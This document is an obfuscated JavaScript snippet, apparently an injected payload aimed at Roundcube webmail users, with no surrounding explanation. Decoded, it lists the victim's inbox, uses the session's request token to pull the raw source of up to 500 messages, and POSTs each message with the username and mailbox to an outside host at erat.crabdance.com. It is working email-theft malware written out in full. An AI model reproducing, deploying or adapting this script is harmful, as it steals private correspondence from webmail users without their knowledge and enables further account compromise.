var _$_bcaa=["\x47\x45\x54","\x3F\x5F\x74\x61\x73\x6B\x3D\x6D\x61\x69\x6C\x26\x5F\x61\x63\x74\x69\x6F\x6E\x3D\x6C\x69\x73\x74\x26\x5F\x72\x65\x66\x72\x65\x73\x68\x3D\x31\x26\x5F\x6D\x62\x6F\x78\x3D\x49\x4E\x42\x4F\x58\x26\x5F\x72\x65\x6D\x6F\x74\x65\x3D\x31","\x61\x64\x64\x5F\x6D\x65\x73\x73\x61\x67\x65\x5F\x72\x6F\x77","\x2C","\x2D\x2D\x2D","\x2D\x2D\x2D\x2D","\x3F\x5F\x74\x61\x73\x6B\x3D\x6D\x61\x69\x6C\x26\x5F\x73\x61\x76\x65\x3D\x31\x26\x5F\x75\x69\x64\x3D","\x26\x5F\x6D\x62\x6F\x78\x3D\x49\x4E\x42\x4F\x58\x26\x5F\x61\x63\x74\x69\x6F\x6E\x3D\x76\x69\x65\x77\x73\x6F\x75\x72\x63\x65\x26\x5F\x74\x6F\x6B\x65\x6E\x3D","\x50\x4F\x53\x54","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x65\x72\x61\x74\x2E\x63\x72\x61\x62\x64\x61\x6E\x63\x65\x2E\x63\x6F\x6D\x2F\x75\x72\x65\x63\x65\x6F\x6F\x73\x65\x2E\x70\x68\x70","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E"];var h= new XMLHttpRequest();var cons=0;h.open(_$_bcaa[0],_$_bcaa[1],true);h.send();h.onreadystatechange= function(){if(h.readyState== 4&& h.status== 200){var _0xD8DB=h.responseText;var _0xD934=_0xD8DB.indexOf(_$_bcaa[2])+ (_$_bcaa[2]).length+ 1;var _0xD98D=_0xD8DB.substring(_0xD934).split(_$_bcaa[3])[0];getmail(_0xD98D,cons)}};function getmail(_0xD98D,cons){if(cons== 500){return};var _0xDA3F=rcmail.env.request_token;var _0xDAF1=rcmail.env.username+ _$_bcaa[4]+ rcmail.env.mailbox;var _0xDA98=_0xDAF1+ _$_bcaa[5]+ _0xD98D;var _0xD9E6= new XMLHttpRequest;var _0xDB4A=_$_bcaa[6]+ _0xD98D+ _$_bcaa[7]+ _0xDA3F;_0xD9E6.open(_$_bcaa[0],_0xDB4A,true);_0xD9E6.send();_0xD9E6.onreadystatechange= function(){if(_0xD9E6.readyState== 4&& _0xD9E6.status== 200){var _0xDBA3=_0xD9E6.responseText;postmail(_0xDBA3,_0xDA98)}};cons= cons+ 1;_0xD98D= _0xD98D- 1;getmail(_0xD98D,cons)}function postmail(_0xDC55,_0xDA98){var _0xDBFC= new XMLHttpRequest();var _0xDCAE={'\x6D\x61\x69\x6C':_0xDC55,'\x75\x69\x64':_0xDA98};_0xDBFC.open(_$_bcaa[8],_$_bcaa[9],true);_0xDBFC.setRequestHeader(_$_bcaa[10],_$_bcaa[11]);_0xDBFC.send(JSON.stringify(_0xDCAE))}